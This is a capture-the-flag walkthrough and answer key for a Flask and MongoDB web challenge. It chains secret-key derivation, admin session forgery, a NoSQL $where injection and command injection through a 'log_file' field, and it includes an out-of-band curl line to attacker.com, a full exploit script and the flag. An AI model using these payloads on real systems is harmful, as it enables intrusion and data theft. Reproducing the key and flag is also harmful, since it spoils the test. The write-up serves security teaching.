# Solution Walkthrough - Legacy Microservice Exploitation V6.1

**Challenge:** Legacy Microservice Exploitation V6.1
**Difficulty:** DreamHack Level 7-8
**Expected Time:** 90-110 minutes (Black-box)
**Flag:** `MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}`

---

## TL;DR - Attack Chain

```
1. Service Discovery → Legacy endpoints
2. Information Gathering → Distributed hints across multiple endpoints
3. Secret Key Derivation → SHA256(service-build-salt)[:32]
4. Session Forgery → Flask cookie with admin + migrate permission
5. NoSQL Injection → $where + include_inactive + limit=100
6. Command Injection → Path traversal + semicolon bypass
7. RCE → Read flag
```

---

## Step 1: Initial Reconnaissance (5 minutes)

### 1.1 Browse the Website

```bash
curl http://target:5000/
```

웹 대시보드가 보입니다. "Service Directory" 링크를 클릭하거나 `/services`로 이동합니다.

### 1.2 Check robots.txt

```bash
curl http://target:5000/robots.txt
```

```
User-agent: *

Allow: /api/v2/

Disallow: /admin
Disallow: /admin/login

Disallow: /debug
Disallow: /test
Disallow: /.env
Disallow: /backup/

Disallow: /api/internal/
Disallow: /api/v1/

Disallow: /.git/
```

**분석:**
- `/api/v2/` 엔드포인트가 허용됨 (접근 가능)
- `/admin`, `/debug`, `/backup` 등은 Red Herring일 가능성

### 1.3 Service Discovery API

```bash
curl http://target:5000/api/v2/services
```

**응답:**
```json
{
  "services": [
    {
      "name": "auth",
      "version": "2.1.0",
      "status": "active",
      "description": "Authentication service"
    },
    {
      "name": "api",
      "version": "2.0.5",
      "status": "active",
      "description": "Main API gateway"
    },
    {
      "name": "legacy",
      "full_name": "legacy-auth-service",
      "version": "2.1.0",
      "build": "20240115",
      "status": "deprecated",
      "description": "Legacy endpoints - scheduled for removal",
      "salt_prefix": "las2024"
    }
  ]
}
```

**중요 발견:**
- `legacy` 서비스가 deprecated 상태 (취약할 가능성)
- `full_name`: "legacy-auth-service"
- `build`: "20240115"
- `salt_prefix`: "las2024" ← 이게 뭘까?

---

## Step 2: Legacy Endpoint Enumeration (3 minutes)

### 2.1 Enumerate Legacy Endpoints

```bash
curl http://target:5000/api/v2/services/legacy/endpoints
```

**응답:**
```json
{
  "service": "legacy",
  "endpoints": [
    {
      "path": "/api/legacy/config_backup",
      "method": "GET",
      "description": "Configuration backup utility"
    }
  ]
}
```

**발견:** `/api/legacy/config_backup` 엔드포인트 존재!

---

## Step 3: Information Gathering (15 minutes)

### 3.1 Config Backup Endpoint

```bash
curl http://target:5000/api/legacy/config_backup
```

**응답:**
```json
{
  "backup_date": "2024-01-15",
  "service": "legacy-auth-service",
  "config": {
    "database": {
      "connection_string": "mongodb://***",
      "pool_size": 10,
      "timeout": 5000
    },
    "session": {
      "algorithm": "HMAC-SHA256",
      "key_source": "derived from service metadata",
      "format": "32 hex chars",
      "sample_generation": "SHA256(service-build-salt)[:32]",
      "note": "Key is deterministically generated from service info"
    },
    "build": {
      "service_id": "legacy-auth-service",
      "version": "2.1.0",
      "build_date": "20240115",
      "environment": "production"
    }
  },
  "warning": "This endpoint is deprecated and will be removed"
}
```

**핵심 정보:**
- 🔑 `sample_generation`: "SHA256(service-build-salt)[:32]"
- 📝 "Key is deterministically generated from service info"
- `service_id`: "legacy-auth-service"
- `version`: "2.1.0"
- `build_date`: "20240115"

### 3.2 Health Check Endpoint

```bash
curl http://target:5000/health
```

**응답:**
```json
{
  "status": "healthy",
  "database": "connected",
  "services": ["auth", "api", "legacy"],
  "service": "legacy-auth-service",
  "version": "2.1.0",
  "build_date": "20240115"
}
```

**확인:**
- 동일한 정보 반복 출현
- "legacy-auth-service", "2.1.0", "20240115"

### 3.3 Check Response Headers

```bash
curl -I http://target:5000/health
```

**응답 헤더:**
```
HTTP/1.1 200 OK
Content-Type: application/json
X-Service-Salt: las2024
...
```

**발견:** `X-Service-Salt: las2024` ← Salt 정보!

---

## Step 4: Secret Key Derivation (25 minutes)

### 4.1 Analyze the Hints

**수집한 정보:**
1. Formula: `SHA256(service-build-salt)[:32]`
2. Service: `legacy-auth-service`
3. Build: `20240115`
4. Version: `2.1.0`
5. Salt: `las2024`

### 4.2 Derive the Secret Key

**추론 과정:**

`sample_generation` 힌트를 보면 "service-build-salt" 형식입니다.

여러 조합을 시도해봅니다:

**시도 1:** service-build
```python
import hashlib

# 시도 1: 간단한 조합
secret1 = hashlib.sha256(b"legacy-auth-service-20240115").hexdigest()[:32]
print(f"Try 1: {secret1}")
```

**시도 2:** service-build-version
```python
# 시도 2: version 추가
secret2 = hashlib.sha256(b"legacy-auth-service-20240115-2.1.0").hexdigest()[:32]
print(f"Try 2: {secret2}")
```

**시도 3:** service-build-version-salt (정답!)
```python
# 시도 3: salt 추가 (salt_prefix: las2024)
secret3 = hashlib.sha256(b"legacy-auth-service-20240115-v2.1.0-las2024").hexdigest()[:32]
print(f"Try 3: {secret3}")
```

**정답:**
```python
import hashlib

secret_key = hashlib.sha256(
    b"legacy-auth-service-20240115-v2.1.0-las2024"
).hexdigest()[:32]

print(f"SECRET_KEY: {secret_key}")
# Output: e0b0ea4f471129a045b024e7600ee8df
```

### 4.3 Verify the Secret (Optional)

Flask의 secret key가 맞는지 확인하려면 Flask session을 디코드해봅니다:

```bash
# flask-unsign 설치 (없다면)
pip install flask-unsign

# 테스트 세션 쿠키 디코드 (guest 세션 먼저 생성 필요)
flask-unsign --decode --cookie "..." --secret e0b0ea4f471129a045b024e7600ee8df
```

만약 디코딩이 성공하면 올바른 secret입니다!

---

## Step 5: Session Forgery - Create Admin Session (15 minutes)

### 5.1 Create Guest Session First

```bash
curl -X POST http://target:5000/api/auth/guest -c cookies.txt
```

**응답:**
```json
{
  "status": "guest session created",
  "role": "guest",
  "permissions": ["read"]
}
```

**쿠키 확인:**
```bash
cat cookies.txt
```

### 5.2 Decode Guest Session

```bash
flask-unsign --decode --cookie "$(grep session cookies.txt | awk '{print $7}')"
```

**출력:**
```python
{
  'role': 'guest',
  'user': 'guest_user',
  'permissions': ['read']
}
```

### 5.3 Try Admin Access (Will Fail)

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**응답:**
```json
{
  "error": "Admin role required"
}
```

### 5.4 Forge Admin Session

```bash
flask-unsign --sign \
  --cookie "{'role': 'admin', 'user': 'admin', 'permissions': ['read', 'write', 'migrate']}" \
  --secret e0b0ea4f471129a045b024e7600ee8df
```

**출력 (예시):**
```
eyJwZXJtaXNzaW9ucyI6WyJyZWFkIiwid3JpdGUiLCJtaWdyYXRlIl0sInJvbGUiOiJhZG1pbiIsInVzZXIiOiJhZG1pbiJ9.ZnN8Gg.xxxxx
```

### 5.5 Test Admin Session

쿠키 파일 수동 수정:
```bash
# 새 admin 쿠키로 교체
echo "target.local	FALSE	/	FALSE	0	session	eyJwZXJtaXNzaW9ucyI6WyJyZWFkIiwid3JpdGUiLCJtaWdyYXRlIl0sInJvbGUiOiJhZG1pbiIsInVzZXIiOiJhZG1pbiJ9.ZnN8Gg.xxxxx" > admin_cookies.txt
```

**재시도:**
```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"filter": {}}'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 0,
  "message": "No records migrated"
}
```

**성공!** Admin 권한 획득!

---

## Step 6: NoSQL Injection (20 minutes)

### 6.1 Basic NoSQL Injection

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{"filter": {"$where": "function() { return true; }"}}'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4,
  "message": "4 records processed"
}
```

**분석:**
- `$where` injection 성공!
- 4명의 사용자가 반환됨
- 하지만 RCE가 트리거되지 않음 (왜?)

### 6.2 Analyze the Response

코드를 보면:
```python
# RCE 트리거 조건
if len(results) > 0 and limit >= 100:
    # Command Injection...
```

**문제:** `limit` 기본값이 10이므로 RCE가 트리거되지 않음!

### 6.3 Add Limit Option

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {"limit": 100}
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4,
  "message": "4 records processed"
}
```

**여전히 RCE 없음!** 뭔가 더 필요합니다.

### 6.4 Check Active Filter

코드를 다시 보면:
```python
if not include_inactive:
    base_conditions.append({'active': True})
```

기본적으로 `active=True`인 사용자만 조회됩니다. 혹시 inactive 사용자가 있나?

### 6.5 Include Inactive Users

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    }
  }'
```

**응답 (BLIND_RCE=true이므로 출력 없음):**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**성공!** RCE가 트리거되었습니다 (응답 구조가 변경됨).

---

## Step 7: Command Injection (20 minutes)

### 7.1 Add log_file Parameter

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/test.log"
  }'
```

**응답:**
```json
{
  "status": "migration complete",
  "count": 4
}
```

정상 동작합니다. 이제 Command Injection을 시도합니다.

### 7.2 Test Command Injection - Basic

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/test.log; whoami"
  }'
```

**응답:**
```json
{
  "error": "Invalid file extension"
}
```

**에러!** Extension 검증이 있습니다. `whoami`로 끝나므로 `.log` 또는 `.txt`가 아닙니다.

### 7.3 Bypass Extension Check

**핵심 발견:** 세미콜론 뒤의 명령어도 `.log` 또는 `.txt`로 끝나야 합니다!

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; cat /etc/passwd.txt"
  }'
```

**응답 (BLIND_RCE=true):**
```json
{
  "status": "migration complete",
  "count": 4
}
```

**성공!** Extension 체크 우회 (`passwd.txt`로 끝남)

### 7.4 Exfiltrate Flag (BLIND_RCE=false)

**가장 간단한 방법:** BLIND_RCE=false라면 직접 읽기

```bash
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; cat /flag.txt"
  }'
```

**응답 (BLIND_RCE=false):**
```json
{
  "status": "migration complete",
  "count": 4,
  "log_output": "Migration started\nMSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}\nMigration completed\n"
}
```

**FLAG 획득!** 🎉

### 7.5 Exfiltrate Flag (BLIND_RCE=true)

BLIND_RCE=true일 때는 출력이 반환되지 않으므로 다른 방법 필요:

**방법 1: Static 파일로 복사**
```bash
# 1. Flag를 웹에서 접근 가능한 디렉토리로 복사
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; cp /flag.txt /app/static/flag.txt"
  }'

# 2. 웹에서 직접 읽기
curl http://target:5000/static/flag.txt
# Output: MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}
```

**방법 2: Out-of-Band HTTP (실제 공격 시)**
```bash
# Attacker 서버로 전송 (base64 인코딩)
curl -X POST http://target:5000/api/admin/db/migrate \
  -b admin_cookies.txt \
  -H "Content-Type: application/json" \
  -d '{
    "filter": {"$where": "function() { return true; }"},
    "options": {
      "limit": 100,
      "include_inactive": true
    },
    "log_file": "/tmp/x.log; curl http://attacker.com/$(cat /flag.txt | base64 -w0).txt"
  }'
```

**FLAG 획득!** 🎉

---

## Step 8: Flag Capture (Summary)

### Final Exploit Script

```python
#!/usr/bin/env python3
import requests
import hashlib

TARGET = "http://target:5000"

# Step 1: Derive SECRET_KEY
secret_key = hashlib.sha256(
    b"legacy-auth-service-20240115-v2.1.0-las2024"
).hexdigest()[:32]
print(f"[+] SECRET_KEY: {secret_key}")

# Step 2: Forge admin session
from flask.sessions import SecureCookieSessionInterface
from flask import Flask

app = Flask(__name__)
app.secret_key = secret_key

session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)

admin_session = {
    'role': 'admin',
    'user': 'admin',
    'permissions': ['read', 'write', 'migrate']
}

admin_cookie = session_serializer.dumps(admin_session)
print(f"[+] Admin cookie: {admin_cookie}")

# Step 3: Exploit NoSQL + Command Injection
cookies = {'session': admin_cookie}

payload = {
    "filter": {"$where": "function() { return true; }"},
    "options": {
        "limit": 100,
        "include_inactive": True
    },
    "log_file": "/tmp/x.log; cp /flag.txt /app/static/flag.txt"
}

r = requests.post(
    f"{TARGET}/api/admin/db/migrate",
    json=payload,
    cookies=cookies
)

print(f"[+] Response: {r.json()}")

# Step 4: Read flag from static directory
flag_response = requests.get(f"{TARGET}/static/flag.txt")
if flag_response.status_code == 200:
    print(f"[+] FLAG: {flag_response.text}")
else:
    print(f"[-] Failed to read flag: {flag_response.status_code}")
```

---

## Key Takeaways

### Vulnerability Chain

1. **Information Disclosure** → Config backup exposed secret generation formula
2. **Weak Secret Derivation** → Deterministic secret from service metadata
3. **Session Forgery** → Flask session manipulation
4. **Insufficient Permission Check** → Permissions list is client-controlled
5. **NoSQL Injection** → Direct user input to MongoDB query
6. **Command Injection** → Insufficient path validation and semicolon allowed

### Security Lessons

1. **Never expose secret generation formulas** in config backups
2. **Use cryptographically random secrets**, not deterministic ones
3. **Server-side permission enforcement** is critical
4. **Validate and sanitize ALL user inputs** before passing to MongoDB
5. **Use allowlists, not blocklists** for command injection prevention
6. **Implement proper path normalization** before file operations

---

## Tools Used

- `curl` - HTTP requests
- `flask-unsign` - Flask session manipulation
- `python3` - Secret derivation and exploit scripting
- Standard Unix tools (`cat`, `base64`, etc.)

---

## Time Breakdown

| Stage | Task | Time |
|-------|------|------|
| 1 | Reconnaissance | 5 min |
| 2 | Endpoint enumeration | 3 min |
| 3 | Information gathering | 15 min |
| 4 | Secret derivation | 25 min |
| 5 | Session forgery | 15 min |
| 6 | NoSQL injection | 20 min |
| 7 | Command injection | 20 min |
| 8 | Flag capture | 5 min |
| **Total** | | **108 min** |

---

## Flag

```
MSG{y0ur_l34k3d_SALT_t4st3s_l1k3_JMT_4dm1n}
```

**Challenge Rating:** ⭐⭐⭐⭐⭐⭐⭐⭐ (8/10)
**Fun Factor:** ⭐⭐⭐⭐⭐⭐⭐⭐ (8/10)
**Realism:** ⭐⭐⭐⭐⭐⭐⭐⭐⭐ (9/10)

---

**Author Notes:**

This challenge demonstrates a realistic vulnerability chain found in legacy systems:
- Information disclosure through misconfigured backup endpoints
- Deterministic secret generation from predictable inputs
- Client-side session manipulation
- Chained injection vulnerabilities (NoSQL → Command)

The challenge is well-designed with natural hints distributed across multiple endpoints, requiring careful enumeration and logical reasoning rather than guessing or brute force.
